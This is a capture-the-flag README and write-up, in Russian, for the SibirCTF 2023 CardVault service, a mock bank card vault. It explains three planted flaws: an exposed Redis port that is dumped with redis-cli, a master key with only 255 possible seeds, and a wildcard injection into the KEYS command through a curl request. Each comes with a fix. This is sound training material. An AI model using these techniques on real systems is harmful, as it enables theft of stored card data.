# 2023-service-sibirctf-cardvault

Автор: Поляков Игорь

SibirCTF 2023 CardVault service

![Screenshot 2023-11-21 at 12-35-27 South Park Bank Card Vault](https://github.com/SibirCTF/2023-service-sibirctf-cardvault/assets/2613581/6bd4cd0f-2217-4ae1-90bb-b14f9340b925)

Stream from Scoreboard:

https://www.youtube.com/watch?v=v9rq2A7iNK8&t

## Установка и запуск

Смотрите Dockerfile, docker-compose и .gitlab-ci.yml

## WriteUp

Идея - лк инженера антифрод отдела, есть процедура, когда при оплате картой банковской подозрительные покупки попадают на ручную проверку.
Сервис - это реализация этой идеи.
Ваша цель - украсть данные карт пользователей

### 1) Ошибки конфигурирования - redis доступен извне
Можно вытащить данные или удалить данные у соседних команд
Так не будет очков защиты и другие не украдут эти флаги.
Но флаг не лежит в базе текстом, он зашифрован
Ключ есть в приложении. Можно используя приложения. Расшифровать данные их БД.

Пример

```sh
root@server-kptszi ~/card_vault [127]# redis-cli
127.0.0.1:6379> KEYS *
 1) "SouthParkBankTest:782784f8-b765-47c6-b4a1-afc05e56e107"
....
 2) "SouthParkBankTest:9f4d26b6-2c77-4adf-b6c0-da093081998f"
13) "SouthParkBankTest:deca6ec7-8a93-4175-9ab3-4bb28c129b59"
127.0.0.1:6379> GET SouthParkBankTest:deca6ec7-8a93-4175-9ab3-4bb28c129b59
"AsxZlDYuAi/lR9S5JT7X7iLY3AAjuYNrwiJQr8EN7gIskHfxstCorZug67ZxJznApQHu2H41ZPx3GK0DvFFmQQV4Zmgfw5SwYRCHb5Kpos7LpDzWje7E5ZpXpHdnDxjXLwlIJQpY2owuxZeucGRKFIMEXgG4WeMAlvYn3r+XzBMqe6F67Ji54TBvlYmu+/6tlyUHoy2XL4mEUhAV4XRjZ6z/KQqzOqknoNcG8RZo6oF8jvsUlL1AHZiGTtlIujdWUFXWFRJFQRB0Bqdu7taJB9B3J5Y9wEOLublLqwLmUb4Zj813RmgDDO2YMjMvUoON5w+pLh5lMBVYWEYF/a+70xoNrCMPgFXFk14W5NlHTjtQ4IXcU0SYiS+Ky8G97H1jbhNl7EC8EDV2NwNe+R5PG3t1zS+3oTKCFp9pA8+zjygnN7YUb0dvvLL74kaLSHfpvwR82YWWf1UX7zw+4paGem5TW4JKgQ2o8RtKtW3sErUD/By9QafxIozMp633c5jDbZGPkmWUJZDdiz9XPgYGUWWuJr8RNlbsHRCVWV9GaoqB5uVwlWwbgQu8ystkAZI6qjFKw67s7pG8ohKx63lT5fA8vC0awDroXqo60Rj7VflRrpHvS+B/HYWE/y1Ajn83Dd4bjrS3UUquVzpqOyFn3iTrs6PdpO0GG2i+g5eXOOPaYsGckyDiJKabOykO4JfK+819Ijxp6ORj8EoAAtj9b+fCJG5mVDcV24TeSedBBEki7BsTDzZTvCHnrSF/OszqsWojJWrCsjsmzwM4hveXanUu8EzRcAy2nO2MSMP090MTdMUXEisNFb1CBqp4sPO8"
127.0.0.1:6379>
```

Используем `terminal key` `SouthParkBankTest` и токен платежа `deca6ec7-8a93-4175-9ab3-4bb28c129b59`

> request

```sh
root@host ~/h/c/s/b/dev (master)> curl 'http://127.0.0.1:7000/SouthParkBankTest/payments/deca6ec7-8a93-4175-9ab3-4bb28c129b59' -H 'Accept: application/json, text/plain, */*'

```
> response
```json
{
  "token": "deca6ec7-8a93-4175-9ab3-4bb28c129b59",
  "status": "pending",
  "order_id": "05592958094",
  "items": [
    {
      "price": 0.1,
      "image_url": "Ic_item_brk_bottle.png",
      "description": "Broken Bottle"
    }
  ],
  "created_at": "21/11/23 09:34:55",
  "card": {
    "pan": "5353530200033106",
    "exp_date_year": "25",
    "exp_date_month": "08",
    "cvv": "ТУТ ФЛАГ",
    "cardholder": "STOLEY KEVIN"
  },
  "amount": 1.8
}
```

#### Решение
Закрыть порт доступный извне

### 2) Для мастер ключа недостаточно сидов

```elixir
iex(1)> :crypto.mac(:hmac, :sha256, :crypto.strong_rand_bytes(0), :crypto.strong_rand_bytes(1)) -> # <<188, 112, 159, 203, 108, 244, 20, 231, 44, 207, 227, 99, 82, 251, 240, 234, 90, 30, 219, 163, 237, 4, 228, 16, 78, 137, 69, 128, 191, 114, 112, 200>>

:crypto.strong_rand_bytes(0) # -> 0
:crypto.strong_rand_bytes(1) # -> 1..255
```

т.е при таких вводных всего 255 ключей для всех
их можно перебрать либо забрав данные из redis'a напрямую
либо через endpoint `/remote_dump`

так же была подсказка в `test.ex` которая намекала на конечное кол-во ключей

```elixir
Enum.map(Enum.to_list(1..900000), fn _ ->
  :crypto.mac(:hmac, :sha256, :crypto.strong_rand_bytes(1), :crypto.strong_rand_bytes(1))
  |> Base.encode16()
end)
|> Enum.into(MapSet.new())
|> MapSet.size() # ->

([
...
 "983A57EFA01D9D27B814325A33504F7D478DD035E9C02F9CA451C096BA1E3888",
 "0B24F962FDD39650AEC3D90792A32C7D55D24E3B3B66DA21A7334B436515BA9F",
 "28277E3523EBCCB0282660BEEAB1569851AB67DAC97C17ED1F9D7DD6949D059A",
 "EF8525332631A6B131CDF5F42EAF524BA99ECF206965F38CC3929FFAE7B4AA55",
 "8B3FCF91F314F55065C0683ACD9CFEF986DF75E10FF170197B9BB9EC9A68776F",
 "C050440704801972B580E2353D67921CB7144B8DA0531E5A819D90065DB6401F",
 "58A35074AFA630A3D760264447BCD3E71FBF323A99A446F6FC27883A29FC370A",
 ...]
 )

```

#### решение
В целом замена 0 и 1 на любое число больше дало бы достаточно seed'ов для нового ключа
по хорошему и эту ручку можно было убрать

## 3) inject в redis
В файле `redis.ex` который обертка над `redix`
есть метод который использует пользовательский ввод для поиска списка покупок принадлежащих одному терминалу, т.е. `*` в качестве ввода вернула бы список всех покупок.

```elixir
  def list(terminal_key) do
    case Redix.command(:redix, ["KEYS", "#{terminal_key}:*"]) do
      {:ok, data} -> {:ok, data}
    end
  end
```

> requsest
```sh
curl 'http://127.0.0.1:7000/*/payments' -H 'Accept: application/json, text/plain, */*'
```

Из полученного списка достаем `token` и `terminal_key` и далее как в пункте 1.

подсказка про `terminal -> DEMO` как раз намекала на эту проблему

#### решение

для защиты - нужно сделать валидацию/фильтрацию ввода
